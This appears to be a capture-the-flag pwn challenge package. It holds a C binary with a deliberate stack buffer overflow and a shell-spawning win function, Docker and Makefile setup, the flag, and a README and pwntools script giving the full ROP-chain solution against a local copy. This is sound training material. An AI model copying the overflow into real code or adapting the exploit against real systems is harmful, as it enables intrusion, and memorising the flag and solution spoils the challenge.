{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\nARG lib\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD $lib.c /tmp/$lib.c\nADD $lib.h /tmp/$lib.h\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY --from=build /tmp/lib$name.so /pwn/lib$name.so\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n\n\n",
    "flag.txt": "gigem{r0p_g4dg3ts_r_c00l}\n",
    "foo.c": "#include \"foo.h\"\n\nvoid setup() {\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nvoid win() {\n    system(\"/bin/bash\");\n}\n\nvoid pwnme() {\n    char buf[0x10];\n\n    setup();\n    puts(\"pwn me\");\n    read(0, buf, 0x48);\n\n    return;\n}\n",
    "foo.h": "#include <stdio.h>\n#include <unistd.h>\n\nextern void pwnme();\n\n",
    "Makefile": "CC := $(or $(CC),gcc)\nNAME := pwnme\nLIB := foo\nPORT := 7004\nCFLAGS1 := -c -fpic -w\nCFLAGS2 := -shared\nCFLAGS3 := -L./ -Wl,-rpath=./ -l$(NAME) -lc -no-pie -fno-stack-protector -masm=intel\n\nclean: .PHONY\n\tdocker container rm -f $(NAME)\n\tdocker rmi -f $(NAME)\n\trm -f $(NAME) $(NAME).zip lib$(NAME).so \n\nall:\n\t$(CC) $(CFLAGS1) $(LIB).c\n\t$(CC) $(CFLAGS2) -o lib$(NAME).so $(LIB).o\n\t$(CC) $(CFLAGS3) -o $(NAME) $(NAME).c \n\ndocker: Dockerfile\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) --build-arg lib=$(LIB) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME) lib=$(LIB)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) $(NAME)\n\tdocker cp $(id):/pwn/lib$(NAME).so lib$(NAME).so\n\tdocker rm -v $(id)\n\ndist: extract \n\tzip $(NAME).zip $(NAME) lib$(NAME).so\n\n.PHONY:\n\n\n#gcc -shared -o lib$(LIB)e2.so $(LIB)o\n#gcc -L./ -o vuln chall.c -l$(LIB)e2  -lc -fno-stack-protector -no-pie\n\n#clean:\n#\trm $(LIB)o lib$(LIB)e2.so vuln\n\n",
    "pwnme.c": "#include \"foo.h\"\n\nasm( \n    \"mov rax, qword ptr [rdi]\\n\\t\"\n    \"ret\\n\\t\"\n    );\n\nint main() {\n    asm(\"sub rsp, 0x18\\n\\t\");\n    pwnme();\n    asm(\"add rsp, 0x18\\n\\t\");\n}\n\nasm(\n    \"sub rax, rsi\\n\\t\"\n    \"ret\\n\\t\"\n    );\n",
    "README.md": "# pwnme\n\nAuthor: `_mac_`\n\npwn me. that's it.\n\n## Dev Notes\nGiven `pwnme` binary file and `libpwnme.so`\nSet up remote with `make run`\nGet needed files with `make extract`\n\n## Solution\nUsing the following gadgets in `pwnme` we can call anything in a shared library if there's a got entry for one of it's functions and we know the offset to what we want to call:\n\n```\n0x0000000000401191 : mov rax, qword ptr [rdi] ; ret\n0x00000000004011b2 : sub rax, rsi ; ret\n0x000000000040109c : jmp rax\n```\n\nUnfortunately, our read is too small for this to work, the payload is 88 bytes long but we only have 72 bytes of read! No problem, since what we can do is write the last part of the payload, then ret to almost the start of main, where it does `sub rsp, 0x18` to shift the stack back down, write the first part of our payload, and this gives us enough bytes to win! See `solve.py` for details\n\nFlag: `gigem{r0p_g4dg3ts_r_c00l}`\n",
    "solve.py": "#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"./pwnme\")\nlib = ELF(\"./libpwnme.so\")\n\ncontext.binary = exe\n\n\ndef conn():\n    if args.REMOTE:\n        r = remote(\"localhost\", 7004)\n    else:\n        r = process([exe.path])\n        gdb.attach(r, gdbscript='b *pwnme+54\\nc')\n    return r\n\n\ndef main():\n    r = conn()\n\n    # good luck pwning :)\n    # plan: read in pwnme_got into rax > sub rax, 0x18 > jmp rax\n    gadget0 = p64(0x401191) # : mov rax, qword ptr [rdi] ; ret\n    gadget1 = p64(0x4011b2) # : sub rax, rsi ; ret\n    gadget2 = p64(0x40109c) # : jmp rax\n\n    rdi = p64(0x40118b) # : pop rdi ; ret\n    rsi_r15 = p64(0x401189) # : pop rsi ; pop r15 ; ret\n\n    init_ptr = p64(0x4000f8)\n    main = p64(0x401195)\n\n    pwnme_got = p64(0x404018)\n    pwnme_plt = p64(0x401030)\n    \n    # change byte from 0xc7 to 0xaf\n\n    payload = b'A'*24\n    payload += p64(0x401199) # main+4\n    payload += p64(0x18) + p64(0x18) + gadget1\n    payload += gadget2\n    print(len(payload))\n    r.recvuntil(b'pwn me\\n')\n    r.send(payload)\n\n    r.recvuntil(b'pwn me\\n')\n    payload1 = b'B'*24\n    payload1 += rdi + pwnme_got + gadget0\n    payload1 += rsi_r15\n    r.send(payload1)\n\n\n    r.interactive()\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "category": "pwn"
}